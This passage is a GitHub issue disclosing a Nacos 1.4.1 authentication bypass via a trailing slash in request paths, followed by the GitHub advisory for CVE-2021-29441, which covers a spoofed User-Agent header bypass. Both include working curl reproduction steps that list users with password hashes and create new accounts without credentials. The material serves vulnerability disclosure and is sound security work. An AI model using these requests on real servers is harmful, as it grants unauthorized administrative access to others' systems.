Looking further down, the code comes to:

```
Method method = methodsCache.getMethod(req);

if (method == null) {
    chain.doFilter(request, response);
    return;
}

...鉴权代码

```

As you can see, there is a judgment `method == null`, as long as this condition is met, the subsequent authentication code will not go to.

By looking at the `methodsCache.getMethod(req)` code implementation, I found a method that can make the returned method null

com.alibaba.nacos.core.code.ControllerMethodsCache#getMethod

```
public Method getMethod(HttpServletRequest request) {
    String path = getPath(request);
    if (path == null) {
        return null;
    }
    String httpMethod = request.getMethod();
    String urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), "");
    List<RequestMappingInfo> requestMappingInfos = urlLookup.get(urlKey);
    if (CollectionUtils.isEmpty(requestMappingInfos)) {
        return null;
    }
    List<RequestMappingInfo> matchedInfo = findMatchedInfo(requestMappingInfos, request);
    if (CollectionUtils.isEmpty(matchedInfo)) {
        return null;
    }
    RequestMappingInfo bestMatch = matchedInfo.get(0);
    if (matchedInfo.size() > 1) {
        RequestMappingInfoComparator comparator = new RequestMappingInfoComparator();
        matchedInfo.sort(comparator);
        bestMatch = matchedInfo.get(0);
        RequestMappingInfo secondBestMatch = matchedInfo.get(1);
        if (comparator.compare(bestMatch, secondBestMatch) == 0) {
            throw new IllegalStateException(
                    "Ambiguous methods mapped for '" + request.getRequestURI() + "': {" + bestMatch + ", "
                            + secondBestMatch + "}");
        }
    }
    return methods.get(bestMatch);
}

```

```
private String getPath(HttpServletRequest request) {
    String path = null;
    try {
        path = new URI(request.getRequestURI()).getPath();
    } catch (URISyntaxException e) {
        LOGGER.error("parse request to path error", e);
    }
    return path;
}

```

In this code, you can clearly see that the return of the method value depends on

```
String urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), "");
List<RequestMappingInfo> requestMappingInfos = urlLookup.get(urlKey);

```

The key of urlKey, whether the mapping value can be obtained from ConcurrentHashMap of urlLookup

In the composition of urlKey, there is a part of path, and there is a problem with the generation of this part. It is obtained in the following way:

```
new URI(request.getRequestURI()).getPath()

```

A normal visit, such as `curl -XPOST'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test'`, the path obtained will be  `/nacos/v1/auth/users`, and through a specially constructed URL, such as `curl -XPOST'http://127.0.0.1:8848/nacos/v1/auth/users/?username=test&password= test' --path-as-is`, the path will be `/nacos/v1/auth/users/`

In this way, the path will be able to control the trailing slash'/', resulting in the method cannot be obtained from the ConcurrentHashMap urlLookup, why? Because basically all RequestMappings in nacos do not end with a slash'/', only The RequestMapping at the end of the non-slanted bar'/' exists and is stored in the ConcurrentHashMap of urlLookup, then the outermost `method == null` condition will be satisfied, thus bypassing the authentication mechanism.

### 2. The scope of the vulnerability

Sphere of influence: 1.4.1

### 3. loopholes reproduce

1. Access user list interface

```
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9 --path-as-is'

```

As you can see, the authentication is bypassed and the user list data is returned

```
{
    "totalCount": 1,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        }
    ]
}

```

2. Add new user

```
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users/?username=test&password=test --path-as-is'

```

As you can see, authentication has been bypassed and new users have been added

```
{
    "code":200,
    "message":"create user ok!",
    "data":null
}

```

3. View user list again

```
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9 --path-as-is'

```

As you can see, in the returned user list data, there is one more user we created by bypassing authentication.

```
{
    "totalCount": 2,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        },
        {
            "username": "test",
            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
        }
    ]
}

```

4. Visit the homepage `http://127.0.0.1:8848/nacos/`, log in to the new account, and you can do anything

---------------------------------------------------------------------------- 中文

你好，我是threedr3am，我发现nacos最新版本1.4.1对于User-Agent绕过安全漏洞的serverIdentity key-value修复机制，依然存在绕过问题，在nacos开启了serverIdentity的自定义key-value鉴权后，通过特殊的url构造，依然能绕过限制访问任何http接口。

通过查看该功能，需要在application.properties添加配置`nacos.core.auth.enable.userAgentAuthWhite:false`，才能避免`User-Agent: Nacos-Server`绕过鉴权的安全问题。

但在开启该机制后，我从代码中发现，任然可以在某种情况下绕过，使之失效，调用任何接口，通过该漏洞，我可以绕过鉴权，做到：

调用添加用户接口，添加新用户（`POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test`）,然后使用新添加的用户登录console，访问、修改、添加数据。

### 一、漏洞详情

问题主要出现在`com.alibaba.nacos.core.auth.AuthFilter#doFilter`:

```
public class AuthFilter implements Filter {

    @Autowired
    private AuthConfigs authConfigs;

    @Autowired
    private AuthManager authManager;

    @Autowired
    private ControllerMethodsCache methodsCache;

    private Map<Class<? extends ResourceParser>, ResourceParser> parserInstance = new ConcurrentHashMap<>();

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        if (!authConfigs.isAuthEnabled()) {
            chain.doFilter(request, response);
            return;
        }

        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;

        if (authConfigs.isEnableUserAgentAuthWhite()) {
            String userAgent = WebUtils.getUserAgent(req);
            if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) {
                chain.doFilter(request, response);
                return;
            }
        } else if (StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils
                .isNotBlank(authConfigs.getServerIdentityValue())) {
            String serverIdentity = req.getHeader(authConfigs.getServerIdentityKey());
            if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
                chain.doFilter(request, response);
                return;
            }
            Loggers.AUTH.warn("Invalid server identity value for {} from {}", authConfigs.getServerIdentityKey(),
                    req.getRemoteHost());
        } else {
            resp.sendError(HttpServletResponse.SC_FORBIDDEN,
                    "Invalid server identity key or value, Please make sure set `nacos.core.auth.server.identity.key`"
                            + " and `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`");
            return;
        }

        try {

            Method method = methodsCache.getMethod(req);

            if (method == null) {
                chain.doFilter(request, response);
                return;
            }

            ...鉴权代码

        }
        ...
    }
    ...
}

```

可以看到，上面三个if else分支：

* 第一个是`authConfigs.isEnableUserAgentAuthWhite()`，它默认值为true，当值为true时，会判断请求头User-Agent是否匹配`User-Agent: Nacos-Server`，若匹配，则跳过后续所有逻辑，执行`chain.doFilter(request, response);`
* 第二个是`StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils.isNotBlank(authConfigs.getServerIdentityValue())`，也就是nacos 1.4.1版本对于`User-Agent: Nacos-Server`安全问题的简单修复
* 第三个是，当前面两个条件都不符合时，对请求直接作出拒绝访问的响应

问题出现在第二个分支，可以看到，当nacos的开发者在application.properties添加配置`nacos.core.auth.enable.userAgentAuthWhite:false`，开启该key-value简单鉴权机制后，会根据开发者配置的`nacos.core.auth.server.identity.key`去http header中获取一个value，去跟开发者配置的`nacos.core.auth.server.identity.value`进行匹配，若不匹配，则不进入分支执行：

```
if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
    chain.doFilter(request, response);
    return;
}

```

但问题恰恰就出在这里，这里的逻辑理应是在不匹配时，直接返回拒绝访问，而实际上并没有这样做，这就让我们后续去绕过提供了条件。

再往下看，代码来到：

```
Method method = methodsCache.getMethod(req);

if (method == null) {
    chain.doFilter(request, response);
    return;
}

...鉴权代码

```

可以看到，这里有一个判断`method == null`，只要满足这个条件，就不会走到后续的鉴权代码。

通过查看`methodsCache.getMethod(req)`代码实现，我发现了一个方法，可以使之返回的method为null

com.alibaba.nacos.core.code.ControllerMethodsCache#getMethod

```
public Method getMethod(HttpServletRequest request) {
    String path = getPath(request);
    if (path == null) {
        return null;
    }
    String httpMethod = request.getMethod();
    String urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), "");
    List<RequestMappingInfo> requestMappingInfos = urlLookup.get(urlKey);
    if (CollectionUtils.isEmpty(requestMappingInfos)) {
        return null;
    }
    List<RequestMappingInfo> matchedInfo = findMatchedInfo(requestMappingInfos, request);
    if (CollectionUtils.isEmpty(matchedInfo)) {
        return null;
    }
    RequestMappingInfo bestMatch = matchedInfo.get(0);
    if (matchedInfo.size() > 1) {
        RequestMappingInfoComparator comparator = new RequestMappingInfoComparator();
        matchedInfo.sort(comparator);
        bestMatch = matchedInfo.get(0);
        RequestMappingInfo secondBestMatch = matchedInfo.get(1);
        if (comparator.compare(bestMatch, secondBestMatch) == 0) {
            throw new IllegalStateException(
                    "Ambiguous methods mapped for '" + request.getRequestURI() + "': {" + bestMatch + ", "
                            + secondBestMatch + "}");
        }
    }
    return methods.get(bestMatch);
}

```

```
private String getPath(HttpServletRequest request) {
    String path = null;
    try {
        path = new URI(request.getRequestURI()).getPath();
    } catch (URISyntaxException e) {
        LOGGER.error("parse request to path error", e);
    }
    return path;
}

```

这个代码里面，可以很明确的看到，method值的返回，取决于

```
String urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), "");
List<RequestMappingInfo> requestMappingInfos = urlLookup.get(urlKey);

```

urlKey这个key，是否能从urlLookup这个ConcurrentHashMap中获取到映射值

而urlKey的组成中，存在着path这一部分，而这一部分的生成，恰恰存在着问题，它是通过如下方式获得的：

```
new URI(request.getRequestURI()).getPath()

```

一个正常的访问，比如`curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test'`，得到的path将会是`/nacos/v1/auth/users`，而通过特殊构造的url，比如`curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users/?username=test&password=test' --path-as-is`，得到的path将会是`/nacos/v1/auth/users/`

通过该方式，将能控制该path多一个末尾的斜杆'/'，导致从urlLookup这个ConcurrentHashMap中获取不到method，为什么呢，因为nacos基本全部的RequestMapping都没有以斜杆'/'结尾，只有非斜杆'/'结尾的RequestMapping存在并存入了urlLookup这个ConcurrentHashMap，那么，最外层的`method == null`条件将能满足，从而，绕过该鉴权机制。

### 二、漏洞影响范围

影响范围：

1.4.1

### 三、漏洞复现

1. 访问用户列表接口

```
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9'

```

可以看到，绕过了鉴权，返回了用户列表数据

```
{
    "totalCount": 1,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        }
    ]
}

```

2. 添加新用户

```
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test'

```

可以看到，绕过了鉴权，添加了新用户

```
{
    "code":200,
    "message":"create user ok!",
    "data":null
}

```

3. 再次查看用户列表

```
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'

```

可以看到，返回的用户列表数据中，多了一个我们通过绕过鉴权创建的新用户

```
{
    "totalCount": 2,
    "pageNumber": 1,
    "pagesAvailable": 1,
    "pageItems": [
        {
            "username": "nacos",
            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
        },
        {
            "username": "test",
            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
        }
    ]
}

```

4. 访问首页`http://127.0.0.1:8848/nacos/`，登录新账号，可以做任何事情

regards,

threedr3am

## Metadata

### Assignees

No one assigned

### Labels

[kind/bugCategory issues or prs related to bug.](https://github.com/alibaba/nacos/issues?q=state%3Aopen%20label%3A%22kind%2Fbug%22)Category issues or prs related to bug.
### Type

No type
### Projects

No projects
### Milestone

* [1.4.1](https://github.com/alibaba/nacos/milestone/23)
### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7afd02d5_20250115_083943.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-36hp-jr8h-556f)

**CVE-2021-29441**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-36hp-jr8h-556f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2021-29441](/advisories/GHSA-36hp-jr8h-556f)

## Authentication Bypass

High severity

GitHub Reviewed

Published
Apr 27, 2021
to the GitHub Advisory Database
•
Updated Feb 1, 2023

[Vulnerability details](/advisories/GHSA-36hp-jr8h-556f)
[Dependabot alerts
0](/advisories/GHSA-36hp-jr8h-556f/dependabot)

## Package

maven

com.alibaba.nacos:nacos-common
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

< 1.4.1

## Patched versions

1.4.1

## Description

When configured to use authentication (`-Dnacos.core.auth.enabled=true`) Nacos uses the `AuthFilter` servlet filter to enforce authentication. This filter has a [backdoor](https://github.com/alibaba/nacos/blob/5fa05aef52f7432aeab19fe53035431b9d8c91d9/core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#L78-L81) that enables Nacos servers to bypass this filter and therefore skip authentication checks. This mechanism relies on the `user-agent` HTTP header so it can be easily spoofed.

The following request to the `configuration` endpoint gets rejected as we are not providing any credentials:

```
❯ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld"
{"timestamp":"2020-12-02T14:33:57.154+0000","status":403,"error":"Forbidden","message":"unknown user!","path":"/nacos/v1/cs/configs"}

```

However the following one gets accepted by using the `Nacos-Server` user-agent header:

```
❯ curl -X POST -A Nacos-Server "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld"
true

```
#### Impact

This issue may allow any user to carry out any administrative tasks on the Nacos server.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2021-29441>
* [alibaba/nacos#4701](https://github.com/alibaba/nacos/issues/4701)
* [alibaba/nacos#4703](https://github.com/alibaba/nacos/pull/4703)
* [GHSA-36hp-jr8h-556f](https://github.com/advisories/GHSA-36hp-jr8h-556f "GHSA-36hp-jr8h-556f")

Reviewed
Apr 27, 2021

Published to the GitHub Advisory Database
Apr 27, 2021

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-29441)
Apr 27, 2021

Last updated
Feb 1, 2023

### Severity

High

### [EPSS score](https://www.first.org/epss/user-guide)

96.743%
 (100th percentile)

### Weaknesses

[CWE-290](/advisories?query=cwe%3A290)

### CVE ID

CVE-2021-29441

### GHSA ID

GHSA-36hp-jr8h-556f

### Source code

No known source code

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-36hp-jr8h-556f/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


